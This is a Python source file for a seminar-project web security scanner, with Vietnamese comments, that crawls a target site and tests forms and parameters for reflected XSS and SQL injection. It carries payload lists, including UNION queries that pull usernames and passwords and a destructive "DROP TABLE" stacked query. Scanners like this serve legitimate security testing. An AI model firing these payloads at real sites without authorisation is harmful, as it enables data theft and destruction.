#!/usr/bin/env python3
"""
=============================================================
  web_scanner.py — Automated Web Security Scanner
  Mục đích: Phát hiện lỗ hổng XSS & SQL Injection tự động
  Đồ án:    Kiểm thử Bảo mật Web Tự động — Seminar AppSec
  
  Cách dùng:
      pip install requests beautifulsoup4 colorama
      python web_scanner.py --url http://localhost:5000
      python web_scanner.py --url http://localhost:5000 --report report.txt
=============================================================
"""

import requests
import argparse
import json
import sys
import time
import re
from datetime import datetime
from urllib.parse import urljoin, urlencode, urlparse, parse_qs
from bs4 import BeautifulSoup
from colorama import Fore, Style, init

init(autoreset=True)  # colorama auto-reset

# ──────────────────────────────────────────────────────────────
# PAYLOAD DATABASES
# ──────────────────────────────────────────────────────────────

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "'\"><script>alert(document.cookie)</script>",
    "<body onload=alert('XSS')>",
    "javascript:alert(1)",
    "<iframe src=\"javascript:alert('XSS')\">",
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<!--<img src=--><img src=x onerror=alert(1)//-->",
    "<ScRiPt>alert('XSS')</ScRiPt>",          # case bypass
    "%3Cscript%3Ealert(1)%3C/script%3E",       # URL encoded
]

SQLI_PAYLOADS = [
    # Classic error-based
    "'",
    "''",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "\" OR \"1\"=\"1",
    # Boolean-based blind
    "' AND 1=1 --",
    "' AND 1=2 --",
    "1 OR 1=1",
    "1' ORDER BY 1 --",
    "1' ORDER BY 999 --",       # Sẽ gây lỗi nếu không có 999 cột
    # UNION-based
    "' UNION SELECT NULL --",
    "' UNION SELECT 1,2,3,4,5,6,7 --",
    "' UNION SELECT username,password,email,role,1,2 FROM users --",
    # Time-based (SQLite)
    "' AND (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) ) --",
    # Stacked queries
    "'; DROP TABLE products; --",
]

# ──────────────────────────────────────────────────────────────
# ERROR SIGNATURES dùng để phát hiện SQLi
# ──────────────────────────────────────────────────────────────

SQL_ERROR_SIGNATURES = [
    "sqlite3.OperationalError",
    "sqlite3.ProgrammingError",
    "syntax error",
    "unrecognized token",
    "no such column",
    "near",
    "OperationalError",
    "ProgrammingError",
    "SQL syntax",
    "mysql_fetch_array",
    "ORA-",
    "Microsoft OLE DB",
    "Unclosed quotation mark",
    "quoted string not properly terminated",
]

# ──────────────────────────────────────────────────────────────
# SCANNER CLASS
# ──────────────────────────────────────────────────────────────

class WebSecurityScanner:
    def __init__(self, base_url: str, timeout: int = 10, verbose: bool = False):
        self.base_url   = base_url.rstrip("/")
        self.timeout    = timeout
        self.verbose    = verbose
        self.session    = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (AppSec-Scanner/1.0 — Educational Lab)"
        })
        self.findings   = []   # list of Finding dicts
        self.crawled    = []   # các URL/endpoint đã phát hiện

    # ─── Bước 1: Thu thập endpoints ─────────────────────────
    def crawl(self):
        """
        Crawl trang chủ để tìm:
          - <form> và các <input> bên trong
          - <a href> chứa tham số query string (?param=value)
        """
        self._print_section("BƯỚC 1: THU THẬP ENDPOINTS (Crawler)")
        url = self.base_url + "/"
        try:
            resp = self.session.get(url, timeout=self.timeout)
        except requests.RequestException as e:
            self._print_error(f"Không thể kết nối đến {url}: {e}")
            sys.exit(1)

        soup = BeautifulSoup(resp.text, "html.parser")
        
        # 1a. Tìm tất cả FORM
        forms = soup.find_all("form")
        self._print_info(f"Tìm thấy {len(forms)} form trên trang chủ")
        for form in forms:
            action  = form.get("action", "/")
            method  = form.get("method", "get").lower()
            inputs  = [
                {"name": i.get("name"), "type": i.get("type", "text"), "value": i.get("value","")}
                for i in form.find_all("input")
                if i.get("name")
            ]
            endpoint = {
                "type": "form",
                "url": urljoin(self.base_url, action),
                "method": method,
                "params": inputs,
            }
            self.crawled.append(endpoint)
            self._print_ok(f"  [FORM] {method.upper()} {endpoint['url']}")
            for inp in inputs:
                self._print_ok(f"         └─ input[name={inp['name']}, type={inp['type']}]")

        # 1b. Tìm <a href> có query string
        links = soup.find_all("a", href=True)
        seen_patterns = set()
        for link in links:
            href = link["href"]
            full = urljoin(self.base_url, href)
            parsed = urlparse(full)
            if parsed.query:
                qs_params = list(parse_qs(parsed.query).keys())
                # Deduplicate theo (path, sorted params)
                pattern_key = (parsed.path, tuple(sorted(qs_params)))
                if pattern_key not in seen_patterns:
                    seen_patterns.add(pattern_key)
                    endpoint = {
                        "type": "url_param",
                        "url": f"{self.base_url}{parsed.path}",
                        "method": "get",
                        "params": [{"name": p, "type": "text", "value": ""} for p in qs_params],
                        "original_href": href,
                    }
                    self.crawled.append(endpoint)
                    self._print_ok(f"  [URL]  GET {endpoint['url']}?{parsed.query}")
                    for p in qs_params:
                        self._print_ok(f"         └─ param: {p}")

        print()
        return self.crawled

    # ─── Bước 2a: Quét XSS ──────────────────────────────────
    def scan_xss(self):
        self._print_section("BƯỚC 2: QUÉT REFLECTED XSS")
        for endpoint in self.crawled:
            for param in endpoint["params"]:
                if not param["name"]:
                    continue
                for payload in XSS_PAYLOADS:
                    self._test_xss(endpoint, param["name"], payload)
        print()

    def _test_xss(self, endpoint, param_name, payload):
        url    = endpoint["url"]
        method = endpoint["method"]
        
        try:
            if method == "get":
                req_params = {param_name: payload}
                resp = self.session.get(url, params=req_params, timeout=self.timeout)
            else:
                req_params = {param_name: payload}
                resp = self.session.post(url, data=req_params, timeout=self.timeout)
        except requests.RequestException as e:
            if self.verbose:
                self._print_error(f"    Request error: {e}")
            return

        # Phát hiện: payload xuất hiện nguyên vẹn trong response body
        # (chứng tỏ server không escape HTML entities)
        if payload in resp.text:
            finding = {
                "vuln_type": "Reflected XSS",
                "severity":  "HIGH",
                "url":       url,
                "method":    method.upper(),
                "parameter": param_name,
                "payload":   payload,
                "evidence":  self._extract_context(resp.text, payload),
                "http_status": resp.status_code,
            }
            self.findings.append(finding)
            self._print_vuln(
                f"[XSS FOUND] {method.upper()} {url}"
                f"\n             param={param_name}"
                f"\n             payload={payload[:60]}"
            )
        elif self.verbose:
            print(Fore.WHITE + f"  [XSS] MISS — {param_name}={payload[:40]}")

    # ─── Bước 2b: Quét SQL Injection ────────────────────────
    def scan_sqli(self):
        self._print_section("BƯỚC 3: QUÉT SQL INJECTION")
        for endpoint in self.crawled:
            for param in endpoint["params"]:
                if not param["name"]:
                    continue
                # Lấy baseline (request bình thường)
                baseline_len = self._get_baseline(endpoint, param["name"])
                for payload in SQLI_PAYLOADS:
                    self._test_sqli(endpoint, param["name"], payload, baseline_len)
        print()

    def _get_baseline(self, endpoint, param_name) -> int:
        try:
            resp = self.session.get(
                endpoint["url"], params={param_name: "test"}, timeout=self.timeout
            )
            return len(resp.text)
        except:
            return 0

    def _test_sqli(self, endpoint, param_name, payload, baseline_len):
        url    = endpoint["url"]
        method = endpoint["method"]

        try:
            if method == "get":
                resp = self.session.get(url, params={param_name: payload}, timeout=self.timeout)
            else:
                resp = self.session.post(url, data={param_name: payload}, timeout=self.timeout)
        except requests.RequestException:
            return

        body = resp.text.lower()

        # Detection Method 1: SQL error message trong response
        error_found = next((sig for sig in SQL_ERROR_SIGNATURES if sig.lower() in body), None)

        # Detection Method 2: Response length thay đổi đáng kể
        # (Boolean-based: TRUE payload trả nhiều data hơn FALSE)
        len_diff = abs(len(resp.text) - baseline_len)
        length_anomaly = len_diff > 500  # ngưỡng 500 bytes

        # Detection Method 3: ' OR 1=1 -- trả về NHIỀU hơn bình thường đáng kể
        more_data = (len(resp.text) > baseline_len * 1.3) and ("Phones" in payload or "OR 1=1" in payload)

        if error_found or (length_anomaly and ("OR" in payload or "UNION" in payload)):
            detection_method = (
                f"SQL Error: '{error_found}'" if error_found
                else f"Response length anomaly (+{len_diff} bytes)"
            )
            finding = {
                "vuln_type": "SQL Injection",
                "severity":  "CRITICAL",
                "url":       url,
                "method":    method.upper(),
                "parameter": param_name,
                "payload":   payload,
                "evidence":  detection_method,
                "http_status": resp.status_code,
                "response_len": len(resp.text),
                "baseline_len": baseline_len,
            }
            self.findings.append(finding)
            self._print_vuln(
                f"[SQLi FOUND] {method.upper()} {url}"
                f"\n              param={param_name}"
                f"\n              payload={payload[:60]}"
                f"\n              evidence={detection_method}"
            )
        elif self.verbose:
            print(Fore.WHITE + f"  [SQLi] MISS — {param_name}={payload[:40]}")

    # ─── Bước 3: Xuất báo cáo ───────────────────────────────
    def report(self, output_file: str = None):
        self._print_section("BƯỚC 4: BÁO CÁO KẾT QUẢ")
        
        lines = []
        lines.append("=" * 70)
        lines.append("  WEB SECURITY SCANNER — KẾT QUẢ QUÉT")
        lines.append(f"  Target      : {self.base_url}")
        lines.append(f"  Thời gian   : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        lines.append(f"  Endpoints   : {len(self.crawled)}")
        lines.append(f"  XSS Payloads: {len(XSS_PAYLOADS)}")
        lines.append(f"  SQLi Payloads:{len(SQLI_PAYLOADS)}")
        lines.append("=" * 70)

        if not self.findings:
            lines.append("\n  ✅ Không phát hiện lỗ hổng nào.")
        else:
            # Nhóm theo loại lỗ hổng
            xss_findings  = [f for f in self.findings if f["vuln_type"] == "Reflected XSS"]
            sqli_findings = [f for f in self.findings if f["vuln_type"] == "SQL Injection"]

            # Deduplicate (cùng URL + param chỉ report 1 lần)
            def dedupe(lst):
                seen, out = set(), []
                for f in lst:
                    key = (f["url"], f["parameter"])
                    if key not in seen:
                        seen.add(key)
                        out.append(f)
                return out

            xss_findings  = dedupe(xss_findings)
            sqli_findings = dedupe(sqli_findings)

            lines.append(f"\n  🔴 TỔNG LỖ HỔNG PHÁT HIỆN: {len(xss_findings) + len(sqli_findings)}")
            lines.append(f"     - Reflected XSS  : {len(xss_findings)}")
            lines.append(f"     - SQL Injection   : {len(sqli_findings)}")

            # XSS details
            if xss_findings:
                lines.append("\n" + "-" * 70)
                lines.append("  [XSS] REFLECTED CROSS-SITE SCRIPTING")
                lines.append("-" * 70)
                for i, f in enumerate(xss_findings, 1):
                    lines.append(f"\n  #{i} Severity : {f['severity']}")
                    lines.append(f"      URL      : {f['method']} {f['url']}")
                    lines.append(f"      Parameter: {f['parameter']}")
                    lines.append(f"      Payload  : {f['payload']}")
                    lines.append(f"      Evidence : Payload xuất hiện nguyên vẹn trong response HTML")
                    lines.append(f"      HTTP     : {f['http_status']}")
                    lines.append(f"      Fix      : Dùng html.escape() hoặc Jinja2 autoescaping")

            # SQLi details
            if sqli_findings:
                lines.append("\n" + "-" * 70)
                lines.append("  [SQLi] SQL INJECTION")
                lines.append("-" * 70)
                for i, f in enumerate(sqli_findings, 1):
                    lines.append(f"\n  #{i} Severity : {f['severity']}")
                    lines.append(f"      URL      : {f['method']} {f['url']}")
                    lines.append(f"      Parameter: {f['parameter']}")
                    lines.append(f"      Payload  : {f['payload']}")
                    lines.append(f"      Evidence : {f['evidence']}")
                    lines.append(f"      HTTP     : {f['http_status']}")
                    lines.append(f"      Fix      : Dùng Parameterized Query / Prepared Statement")

        lines.append("\n" + "=" * 70)
        lines.append("  END OF REPORT")
        lines.append("=" * 70)

        report_text = "\n".join(lines)

        # In ra terminal
        for line in lines:
            if "FOUND" in line or "🔴" in line or "XSS]" in line or "SQLi]" in line:
                print(Fore.RED + line)
            elif "Fix" in line or "✅" in line:
                print(Fore.GREEN + line)
            elif "===" in line or "---" in line:
                print(Fore.CYAN + line)
            else:
                print(line)

        # Ghi ra file nếu được yêu cầu
        if output_file:
            with open(output_file, "w", encoding="utf-8") as f:
                f.write(report_text)
            print(Fore.GREEN + f"\n[✓] Báo cáo đã lưu vào: {output_file}")

        # JSON export
        json_file = output_file.replace(".txt", ".json") if output_file else None
        if json_file:
            with open(json_file, "w", encoding="utf-8") as f:
                json.dump({
                    "target": self.base_url,
                    "scan_time": datetime.now().isoformat(),
                    "findings": self.findings,
                }, f, indent=2, ensure_ascii=False)
            print(Fore.GREEN + f"[✓] JSON report: {json_file}")

        return self.findings

    # ─── Helpers ────────────────────────────────────────────
    def _extract_context(self, html: str, payload: str, window: int = 100) -> str:
        idx = html.find(payload)
        if idx == -1:
            return ""
        start = max(0, idx - window)
        end   = min(len(html), idx + len(payload) + window)
        return "..." + html[start:end].replace("\n", " ").strip() + "..."

    def _print_section(self, title):
        print(Fore.CYAN + Style.BRIGHT + f"\n{'═'*60}")
        print(Fore.CYAN + Style.BRIGHT + f"  {title}")
        print(Fore.CYAN + Style.BRIGHT + f"{'═'*60}")

    def _print_ok(self, msg):
        print(Fore.GREEN + msg)

    def _print_info(self, msg):
        print(Fore.YELLOW + f"[i] {msg}")

    def _print_vuln(self, msg):
        print(Fore.RED + Style.BRIGHT + f"\n  ⚠️  {msg}")

    def _print_error(self, msg):
        print(Fore.RED + f"[!] {msg}")


# ──────────────────────────────────────────────────────────────
# ENTRY POINT
# ──────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Web Security Scanner — XSS & SQL Injection"
    )
    parser.add_argument("--url",     default="http://localhost:5000",
                        help="Base URL của target (default: http://localhost:5000)")
    parser.add_argument("--report",  default="scan_report.txt",
                        help="Tên file báo cáo output (default: scan_report.txt)")
    parser.add_argument("--timeout", type=int, default=10,
                        help="HTTP timeout (giây, default: 10)")
    parser.add_argument("--verbose", action="store_true",
                        help="Hiển thị chi tiết mọi payload test")
    args = parser.parse_args()

    print(Fore.CYAN + Style.BRIGHT + """
╔══════════════════════════════════════════════════════════╗
║      WEB SECURITY SCANNER — AppSec Seminar Tool         ║
║      Phát hiện: Reflected XSS + SQL Injection           ║
╚══════════════════════════════════════════════════════════╝""")
    print(f"  Target : {args.url}")
    print(f"  Report : {args.report}")
    print(f"  Verbose: {args.verbose}")

    scanner = WebSecurityScanner(
        base_url=args.url,
        timeout=args.timeout,
        verbose=args.verbose,
    )

    start = time.time()

    scanner.crawl()
    scanner.scan_xss()
    scanner.scan_sqli()
    scanner.report(output_file=args.report)

    elapsed = time.time() - start
    print(Fore.CYAN + f"\n  ⏱  Tổng thời gian quét: {elapsed:.2f} giây")

if __name__ == "__main__":
    main()
